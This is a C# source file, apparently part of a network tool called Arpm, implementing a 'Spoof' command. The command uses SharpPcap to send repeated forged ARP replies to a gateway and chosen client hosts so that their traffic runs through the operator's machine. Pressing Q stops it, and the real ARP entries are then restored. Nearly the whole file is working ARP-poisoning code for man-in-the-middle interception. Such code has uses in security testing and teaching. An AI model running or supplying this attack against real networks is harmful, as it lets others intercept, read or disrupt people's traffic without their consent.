using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Arpm.Command
{
    class Spoof : AbstractCommand<Option.Spoof>
    {
        protected LibPcapLiveDevice Device;

        protected KeyValuePair<IPAddress, PhysicalAddress> Route;

        protected Dictionary<IPAddress, PhysicalAddress> Clients;

        protected int TimeSpan;

        protected ARP Arp;

        protected void Config()
        {
            var routeIP = IPAddress.Parse(Option.RouteIP);

            TimeSpan = Option.TimeSpan;

            Device = Manager.GetNetworkDeviceByCode(Option.Interface).Pcap;

            Arp = new ARP(Device);

            Route = new KeyValuePair<IPAddress, PhysicalAddress>(routeIP, Arp.Resolve(routeIP));

            Clients = new Dictionary<IPAddress, PhysicalAddress>();

            foreach (var ips in Option.ClientIP)
            {
                var ip = IPAddress.Parse(ips);

                Clients.Add(ip, Arp.Resolve(ip));
            }
        }

        public override void Execute()
        {
            Config();

            var thread = new Thread(SpoofHanlder);

            thread.Start();

            Console.WriteLine("Spoofing has started");

            Console.Write("Please press the <Q> to stop spoofing ");

            while (true)
            {
                if (Console.ReadKey(true).Key == ConsoleKey.Q)
                {
                    break;
                }
            }

            Console.WriteLine();

            thread.Abort();

            Console.WriteLine("Spoofing has stopped");

            Console.WriteLine("Wait until the network recovers...");

            Normalization();

            Console.WriteLine("Arp entries restored");
        }

        protected void SpoofHanlder()
        {
            while (true)
            {
                foreach (var client in Clients)
                {
                    Arp.Resolve(Route.Key, client.Key, Device.Interface.MacAddress);

                    Arp.Resolve(client.Key, Route.Key, Device.Interface.MacAddress);
                }

                Thread.Sleep(TimeSpan);
            }
        }

        protected void Normalization()
        {
            for (var i = 0; i < 10; i++)
            {
                foreach (var client in Clients)
                {
                    Arp.Resolve(Route.Key, client.Key, client.Value);

                    Arp.Resolve(client.Key, Route.Key, Route.Value);
                }
            }
        }
    }
}
